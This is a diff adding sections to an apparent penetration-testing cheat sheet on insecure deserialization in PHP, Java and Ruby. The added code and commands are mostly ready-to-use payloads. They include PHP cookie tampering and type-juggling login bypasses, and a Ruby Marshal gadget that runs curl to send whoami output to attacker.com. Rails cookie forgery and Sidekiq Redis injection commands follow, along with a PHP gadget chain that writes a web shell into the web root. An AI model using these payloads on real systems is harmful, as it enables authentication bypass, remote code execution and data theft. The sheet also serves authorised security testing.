@@ -43,6 +43,59 @@ grep -oP 'O:\d+:"[^"]+":\d+:{' response.txt
 
 ---
 
+## Quick Wins — Attribute Manipulation
+
+### PHP Object Attribute Tampering
+
+```php
+// Original cookie (base64-decoded):
+O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
+
+// Tampered (change isAdmin to true):
+O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;}
+
+// Change access_level integer:
+// s:12:"access_level";i:1;  →  s:12:"access_level";i:99;
+
+// IMPORTANT: Update string lengths when changing values!
+// s:6:"carlos" → s:5:"admin" (length 6→5)
+```
+
+### PHP Type Juggling via Deserialization
+
+```php
+// Vulnerable pattern: loose comparison after unserialize
+$login = unserialize($_COOKIE['auth']);
+if ($login['password'] == $password) { /* auth success */ }
+
+// Exploit: set password to integer 0
+// On PHP 7.x: 0 == "any_string_not_starting_with_number" → TRUE
+// Payload: a:2:{s:8:"username";s:5:"admin";s:8:"password";i:0;}
+
+// PHP 8.x: 0 == "string" now returns FALSE
+// But: 5 == "5 of something" still TRUE (all PHP versions)
+// So if real password starts with a digit, use that digit as integer
+
+// Also exploitable with NULL:
+// NULL == "" → TRUE (empty password bypass)
+// Payload: a:2:{s:8:"username";s:5:"admin";s:8:"password";N;}
+```
+
+### Java Object Attribute Tampering
+
+```bash
+# Decode base64 session → modify with SerializationDumper
+java -jar SerializationDumper.jar -r base64_session.txt
+
+# Look for: boolean isAdmin = false → change to true
+# Look for: int role = 0 → change to 1 (admin)
+# Re-serialize and re-encode
+
+# Tool: https://github.com/NickstaDB/SerializationDumper
+```
+
+---
+
 ## Java Deserialization
 
 ### Common Vulnerable Endpoints
@@ -490,6 +543,152 @@ import pickletools
 import zlib, base64
 compressed = base64.b64encode(zlib.compress(pickle.dumps(RCE())))
 ```
+
+---
+
+## Ruby Marshal Deserialization
+
+### Detection
+
+```ruby
+# Magic bytes: \x04\x08
+# Common locations: cookies (Rails session), Redis-backed sessions, Sidekiq jobs
+
+# Rails secret_key_base leaked → forge session cookies
+# Check: config/secrets.yml, config/credentials.yml.enc, ENV vars
+```
+
+### Exploitation
+
+```ruby
+# Universal Deserialisation Gadget for Ruby 2.x-3.x
+# Uses ERB template evaluation via Gem::Requirement → Gem::DependencyList
+
+require 'erb'
+require 'base64'
+
+class Exploit
+  def initialize(cmd)
+    @cmd = cmd
+  end
+
+  def marshal_payload
+    # Gadget: Gem::Installer → ERB template
+    code = "system('#{@cmd}')"
+    erb = ERB.allocate
+    erb.instance_variable_set(:@src, code)
+    erb.instance_variable_set(:@filename, "exploit.erb")
+    erb.instance_variable_set(:@lineno, 0)
+
+    wrapper = Gem::Requirement.allocate
+    wrapper.instance_variable_set(:@requirements, { erb => nil })
+
+    Marshal.dump(wrapper)
+  end
+end
+
+payload = Exploit.new("curl http://attacker.com/$(whoami)").marshal_payload
+puts Base64.strict_encode64(payload)
+```
+
+```bash
+# Rails cookie forgery (if secret_key_base known)
+# Tool: https://github.com/mpgn/Rails-cookie-deserialization
+ruby rails_cookie_deser.rb -s SECRET_KEY_BASE -p 'system("id")'
+
+# Sidekiq job injection (if Redis accessible)
+# Inject serialized job with malicious payload into sidekiq queue
+redis-cli -h target LPUSH queue:default '{"class":"ActiveJob::QueueAdapters::SidekiqAdapter::JobWrapper","wrapped":"ExploitJob","args":[MARSHAL_PAYLOAD]}'
+```
+
+### Common Vulnerable Patterns
+
+```
+- Rails apps with leaked secret_key_base
+- Sidekiq/Resque workers (Redis-backed job queues)
+- Dalli/memcached session store with Marshal
+- Any endpoint using Marshal.load() on user input
+- rack-session-cookie with Marshal serializer
+```
+
+---
+
+## Custom Gadget Chain Construction
+
+### Methodology (Source Code Required)
+
+```
+Step 1: IDENTIFY KICK-OFF GADGET
+  → Find classes with magic methods invoked during deserialization:
+    - PHP: __wakeup(), __destruct()
+    - Java: readObject(), readResolve(), readExternal()
+    - Python: __reduce__, __reduce_ex__, __setstate__
+    - Ruby: marshal_load()
+    - .NET: OnDeserialization(), [OnDeserializing], [OnDeserialized]
+
+Step 2: MAP CONTROLLABLE DATA
+  → What properties/fields does the attacker control?
+  → Which of those are passed to method calls?
+
+Step 3: TRACE METHOD CHAINS
+  → From kick-off, follow method invocations:
+    kick-off.__wakeup() → $this->handler->close()
+    → If $handler is attacker-controlled, inject object with close() that does something dangerous
+    → close() → $this->store->write($this->data)
+    → If $store and $data are controllable → file write!
+
+Step 4: IDENTIFY SINK GADGET
+  → Dangerous sinks to look for:
+    - File operations: write, delete, include, require
+    - Code execution: eval, exec, system, call_user_func
+    - Database: query execution with controlled input
+    - SSRF: HTTP requests with controlled URL
+    - Reflection: newInstance, invoke with controlled class/method
+
+Step 5: BUILD PAYLOAD
+  → Construct serialized object that chains:
+    kick-off → intermediate gadgets → sink
+  → Ensure all type/length indicators are correct
+  → Test locally before sending to target
+```
+
+### Example: PHP Custom Chain
+
+```php
+// Kick-off: Logger.__destruct() calls $this->handler->close()
+// Intermediate: StreamHandler.close() calls $this->stream->write($this->buffer)
+// Sink: FileWriter.write() writes to $this->path
+
+class Logger {
+    public $handler;  // → StreamHandler
+}
+class StreamHandler {
+    public $stream;   // → FileWriter
+    public $buffer = '<?php system($_GET["cmd"]); ?>';
+}
+class FileWriter {
+    public $path = '/var/www/html/shell.php';
+}
+
+$chain = new Logger();
+$chain->handler = new StreamHandler();
+$chain->handler->stream = new FileWriter();
+echo serialize($chain);
+```
+
+### Example: Java Custom Chain (Pseudocode)
+
+```java
+// Kick-off: HashMap.readObject() → calls hashCode() on keys
+// Intermediate: TiedMapEntry.hashCode() → calls getValue() → calls LazyMap.get()
+// Sink: LazyMap.get() → calls Transformer.transform() → Runtime.exec()
+
+// This is essentially how CommonsCollections gadgets work
+// Use GadgetInspector to discover new chains in target's classpath:
+java -jar gadget-inspector.jar target-app.war
+```
+
+---
 
 ### General Bypass Techniques
 
